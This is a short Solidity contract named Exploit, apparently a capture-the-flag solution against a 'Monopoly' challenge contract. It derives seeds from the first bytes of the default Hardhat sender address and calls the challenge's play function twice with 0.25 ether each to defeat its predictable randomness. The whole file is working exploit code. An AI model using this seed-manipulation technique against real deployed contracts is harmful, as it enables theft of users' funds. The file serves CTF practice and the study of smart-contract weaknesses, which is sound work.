pragma solidity 0.8.7;

import './Setup.sol';
import 'hardhat/console.sol';

contract Exploit {
    Monopoly challenge;
    constructor(Monopoly _challenge) payable {
        challenge = _challenge;
    }

    function play() public {
        uint16 seed1;
        uint16 seed2;
        // this won't work with all addresses.
        // default hardhat (0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266) is fine.
        require (address(tx.origin) == 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266);
        uint16 prefix = uint16(bytes2(bytes20(address(tx.origin))));
        seed1 = uint16(0x8000) ^ prefix;
        seed2 = uint16(0x4000) ^ prefix;
        challenge.play{value: 0.25 ether}(seed1, seed2);

        seed1 = uint16(0x0001) ^ prefix;
        seed2 = uint16(0x0002) ^ prefix;
        challenge.play{value: 0.25 ether}(seed1, seed2);
    }

    receive() external payable {
    }
}